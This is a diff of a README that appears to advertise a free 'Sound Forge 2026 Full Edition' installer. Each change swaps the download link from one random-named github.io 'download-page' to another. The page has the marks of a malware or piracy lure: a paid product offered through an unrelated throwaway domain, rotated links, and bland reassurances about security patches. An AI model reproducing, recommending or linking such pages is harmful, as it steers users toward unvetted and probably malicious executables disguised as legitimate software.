@@ -2,7 +2,7 @@
 
 Sound Forge 2026 Full Edition is the ultimate audio editing suite designed for Windows desktop users, offering a comprehensive set of tools and plugins for high-quality sound production. This package provides the complete 2026 release with enhanced features, making it ideal for musicians, producers, and audio enthusiasts looking to unlock their creative potential. Whether you're editing podcasts, mastering tracks, or restoring old recordings, Sound Forge 2026 delivers professional-grade performance with ease.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -66,7 +66,7 @@ A5: The software supports a wide range of formats, including MP3, WAV, FLAC, AAC
 
 To get started, download the latest version directly from our GitHub page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides the most recent installer and ensures you have access to all updates and security patches. Remember to verify the file integrity after download for a safe installation.
 
